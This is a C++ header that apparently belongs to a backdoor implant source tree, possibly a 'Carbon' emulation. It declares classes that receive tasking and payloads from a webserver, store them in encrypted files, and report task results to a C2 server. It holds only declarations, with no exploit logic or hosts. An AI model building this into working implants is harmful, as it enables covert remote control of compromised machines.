#pragma once
#include <windows.h>
#include <string>
#include <memory>
#include <iostream>
#include <numeric>

#include <configFile.h>
#include <WindowsWrappers.hpp>
#include "HttpClient.hpp"
#include <Locker.hpp>
#include "Config.hpp"
#include "Logging.hpp"

static const size_t publicKeyStructAndKeySize = 128;
static const size_t signatureDataSize = 128;

const std::string configSection{"CONFIG"};
const std::string configFileNameParam{"name"};
const std::string configExeParam{"exe"};

const char taskInfoSeperator = '|';
const std::string taskInfoSeperatorPretty{{' ', taskInfoSeperator, ' '}};
const std::string pathSeperator{"\\"};

// Main class for tasks
class Task{
    /**
     * Class to hold incoming tasking information.
     * Tasking information provided by webserver response.
     * Tasking information is saved to various files.
     */
    int taskId = -1;
    int routingBlockLen = -1;
    std::shared_ptr<std::string> routingBlock = nullptr;
    int taskCode = -1;
    int taskPayloadLen = -1;
    std::shared_ptr<byte[]> taskPayload = nullptr;
    int configDataLen = -1;
    std::shared_ptr<std::string> configData = nullptr;
    
    bool ExtractData(std::shared_ptr<byte[]> taskData, size_t taskDataSize);
    bool SaveToFile(
        WinApiWrapperInterface* api_wrapper, 
        const std::string file_path, 
        const char* buffer, 
        DWORD buffer_len, 
        bool append_to_file,
        bool encrypt
    );
    bool CreateTaskListFile(WinApiWrapperInterface* api_wrapper);
    bool SaveConfigFile(WinApiWrapperInterface* api_wrapper);
    bool SavePayload(WinApiWrapperInterface* api_wrapper);
    bool AppendTaskInfo(WinApiWrapperInterface* api_wrapper);

public:
    const std::string carbonBaseFolder;
    std::string payloadPath = "";

    Task(std::shared_ptr<byte[]> taskData, size_t taskDataLen, std::string carbonFolder): 
        carbonBaseFolder(carbonFolder) {
            ExtractData(taskData, taskDataLen);
        };

    auto getTaskId(){ return taskId;};
    auto getRoute() { return routingBlock;};
    auto getTaskCode() { return taskCode;};
    std::tuple<std::shared_ptr<byte[]>, int> getPayload() { return std::make_tuple(taskPayload, taskPayloadLen);}
    auto getConfig() { return configData;};
    auto getConfigLen() {return configDataLen;};

    bool SaveTask(WinApiWrapperInterface* api_wrapper){
        static Mutex mutex{taskMutex};
        Locker task_lock(mutex);

        if (taskId == -1) return false;
        if (!CreateTaskListFile(api_wrapper)) return false;
        if (!SaveConfigFile(api_wrapper)) return false;
        SavePayload(api_wrapper);
        return AppendTaskInfo(api_wrapper);
    };

    const std::string getConfigDir() 
        {return carbonBaseFolder + pathSeperator + nlsFolder;};
    const std::string getConfigFile()
        { return getConfigDir() + pathSeperator + configFileNameBeginning + std::to_string(taskId) + configFileNameEnd;}
    const std::string taskFolder()
        { return carbonBaseFolder + pathSeperator + tasksNumberFolder;};
    const std::string taskListFile()
        { return taskFolder() + pathSeperator + tasksListFile; };
    std::string payloadFile() { return payloadPath; };

    virtual std::shared_ptr<ConfigMap> ParseConfigFileWrapper(WinApiWrapperInterface* api_wrapper, std::string file){
        return ParseConfigFile(api_wrapper, file);
    };
};


class TaskReport{
    /**
     * Class to parse and hold outgoing tasking information.
     * Task information is provided by a file,
     * Task information is then pushed to a C2 server.
     */
    public:
    const int taskID;
    const unsigned int numFiles;
    const std::string logFile;
    const std::string objectID;
    
    TaskReport(const int taskId, unsigned int numberOfFiles, const std::string taskLogFilePath, const std::string objectId):
        taskID(taskId), numFiles(numberOfFiles), logFile(taskLogFilePath), objectID(objectId)
        {};
    std::tuple<std::shared_ptr<char[]>, int> BuildBlob(WinApiWrapperInterface* api_wrapper);
    
    static std::list<std::shared_ptr<TaskReport>> getReportableTasks(WinApiWrapperInterface* api_wrapper, const std::string task_report_file);
    bool SendToC2Server(WinApiWrapperInterface* api_wrapper, std::shared_ptr<HttpConnection>, std::string, std::string uuid_override="");
};

std::tuple<std::shared_ptr<char[]>, int> PackageBytes(WinApiWrapperInterface* api_wrapper, std::initializer_list<std::tuple<const void*, int>> itemsToPackage);
